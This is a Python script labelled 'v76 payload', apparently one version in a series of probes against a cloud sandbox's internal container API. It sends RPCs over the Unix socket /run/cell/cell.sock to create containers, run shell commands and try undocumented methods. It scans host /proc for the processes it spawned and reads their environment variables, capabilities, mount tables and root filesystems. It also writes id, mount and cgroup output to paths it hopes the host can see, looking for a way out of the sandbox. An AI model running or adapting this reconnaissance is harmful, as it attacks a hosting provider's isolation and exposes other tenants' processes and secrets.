# -*- coding: utf-8 -*-
"""v76 payload: 宿主 /proc 定位 Exec 进程 (pid/root/cgroup/mountinfo) + Wait processId 变体
核心问题: v73-v75 Exec 返回 processId(hvcp_*) 但副作用全部不可见 -> Exec 进程在宿主侧?
方法: nopid 容器内 /proc == 宿主 /proc, Exec 长驻进程后扫描新 PID"""
import socket, time, os, glob, json

OUT = '/vercel/sandbox/v76c.out'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in (OUT, '/mnt/h/volumes/run/vercel/share/v76c2.out'):
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def rpc(path, body='{}', t=3):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:800].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def exec_cmd(ctr, cid, argv, t=6):
    body = json.dumps({"containerId": cid, "process": {"argv": argv}})
    return rpc(ctr + '/Exec', body, t=t)


def proc_snapshot():
    """宿主 /proc 进程快照: {pid: (cmdline, root, cgroup)}"""
    snap = {}
    for p in glob.glob('/proc/[0-9]*'):
        pid = os.path.basename(p)
        try:
            cl = open(p + '/cmdline', 'rb').read().replace(b'\0', b' ').decode(errors='replace').strip()[:150]
            root = os.readlink(p + '/root')
            cg = ''
            try:
                cg = open(p + '/cgroup').read().replace('\n', ';')[:150]
            except Exception:
                pass
            snap[pid] = (cl, root, cg)
        except Exception:
            pass
    return snap


def probe_proc(pid):
    """对候选进程做深度侦察"""
    log('--- deep probe pid=%s ---' % pid)
    for f in ('/proc/%s/status', '/proc/%s/mountinfo', '/proc/%s/environ'):
        try:
            if f.endswith('status'):
                sel = [ln for ln in open(f % pid, errors='replace') if ln.startswith(
                    ('Name:', 'NSpid:', 'NStgid:', 'Uid:', 'Gid:', 'CapEff:', 'CapBnd:', 'NoNewPrivs:', 'Seccomp:'))]
                log('status: %s' % ' '.join(s.strip() for s in sel))
            elif f.endswith('mountinfo'):
                mi = open(f % pid, errors='replace').read().splitlines()
                log('mountinfo %d lines, first3: %s' % (len(mi), ' || '.join(x[:160] for x in mi[:3])))
            else:
                ev = open(f % pid, 'rb').read().replace(b'\0', b'\n').decode(errors='replace')
                log('environ head: %s' % ev[:400].replace('\n', ' | '))
        except Exception as e:
            log('%s EXC %s' % (f.split('/')[-1], type(e).__name__))
    # 尝试通过 /proc/PID/root 访问其 rootfs
    for rp in ('/proc/%s/root/', '/proc/%s/cwd'):
        try:
            real = os.readlink(rp % pid)
            log('%s -> %s' % (rp % pid, real))
        except Exception as e:
            log('%s readlink EXC %s' % (rp % pid, type(e).__name__))
    try:
        lst = os.listdir('/proc/%s/root/' % pid)
        log('root ls: %s' % lst[:40])
    except Exception as e:
        log('root ls EXC %s' % type(e).__name__)


def main():
    log('V76 payload start pid=%d' % os.getpid())
    CTR = '/vercel.hive.cell.api.containers.v1.ContainersService'

    base = proc_snapshot()
    log('baseline procs=%d' % len(base))

    st, bd = rpc(CTR + '/Create', '{"drive_id":"sandbox"}')
    cid = bd.split('"containerId":"')[1].split('"')[0] if '"containerId"' in bd else None
    log('ID=%s' % (cid or 'NONE'))
    if not cid:
        log('V76C_DONE')
        return
    rpc(CTR + '/Start', '{"containerId":"%s"}' % cid, t=5)
    log('started')
    time.sleep(1)

    # 1) Exec A: 长驻 sleep 300 (供宿主 /proc 捕捉)
    st, bd = exec_cmd(CTR, cid, ['/bin/sh', '-c', 'echo V76_START > /tmp/v76mark; sleep 300'])
    PA = bd.split('"processId":"')[1].split('"')[0] if '"processId"' in bd else None
    log('execA -> %s | PA=%s' % (st, PA or bd[:150]))
    time.sleep(2)

    # 2) 宿主 /proc 差分: 新进程 + 特征进程
    log('--- scan new ---')
    for pid, (cl, root, cg) in proc_snapshot().items():
        if pid not in base or 'v76mark' in cl or 'sleep 300' in cl:
            log('NEW %s | %s | root=%s | cg=%s' % (pid, cl, root, cg))
    log('--- scan marker ---')
    for pid, (cl, root, cg) in proc_snapshot().items():
        if 'v76mark' in cl or 'sleep 300' in cl:
            log('MK %s | %s | root=%s | cg=%s' % (pid, cl, root, cg))
            probe_proc(pid)

    # 3) Wait 变体: processId 字段
    for nm, body in [('plain', '{"containerId":"%s"}' % cid),
                     ('procId', '{"containerId":"%s","processId":"%s"}' % (cid, PA)),
                     ('proc_id', '{"containerId":"%s","process_id":"%s"}' % (cid, PA))]:
        t0 = time.time()
        st, bd = rpc(CTR + '/Wait', body, t=6)
        log('wait-%s (%.1fs) -> %s | %s' % (nm, time.time() - t0, st, bd[:200]))

    # 4) 更多方法探测
    for m in ['GetProcess', 'ListProcesses', 'GetContainer', 'ListContainers', 'Status']:
        st, bd = rpc(CTR + '/' + m, '{}', t=3)
        log('method %s -> %s | %s' % (m, st, bd[:150]))

    # 5) Exec B: 多位置文件副作用 (再验证 + 写入宿主可见 bind 区)
    cmdB = ('mkdir -p /run/vercel/share /vercel/sandbox /tmp /mnt/h/volumes/run/vercel/share 2>/dev/null; '
            'echo B1 > /run/vercel/share/v76b1 2>&1; '
            'echo B2 > /vercel/sandbox/v76b2 2>&1; '
            'echo B3 > /tmp/v76b3 2>&1; '
            'id > /run/vercel/share/v76id 2>&1; '
            'hostname > /run/vercel/share/v76hn 2>&1; '
            'mount > /run/vercel/share/v76mount 2>&1; '
            'cat /proc/self/cgroup > /run/vercel/share/v76cg 2>&1; '
            'ls -la / > /run/vercel/share/v76rootls 2>&1; '
            'echo DONE')
    st, bd = exec_cmd(CTR, cid, ['/bin/sh', '-c', cmdB], t=8)
    log('execB -> %s | %s' % (st, bd[:150]))
    time.sleep(3)

    # 6) 副作用轮询 (payload 视角)
    paths = ['/run/vercel/share/v76b1', '/run/vercel/share/v76id', '/run/vercel/share/v76hn',
             '/run/vercel/share/v76mount', '/run/vercel/share/v76cg', '/run/vercel/share/v76rootls',
             '/vercel/sandbox/v76b2', '/tmp/v76b3']
    t_wait = 0
    while t_wait < 12:
        time.sleep(1)
        t_wait += 1
        for p in paths:
            try:
                if os.path.exists(p) and os.path.getsize(p) > 0:
                    cur = open(p, errors='replace').read()
                    log('--- %s ---\n%s' % (p, cur[:3000]))
                    paths.remove(p)
            except Exception:
                pass

    rpc(CTR + '/Kill', '{"containerId":"%s"}' % cid)
    log('killed')
    log('V76C_DONE')


main()
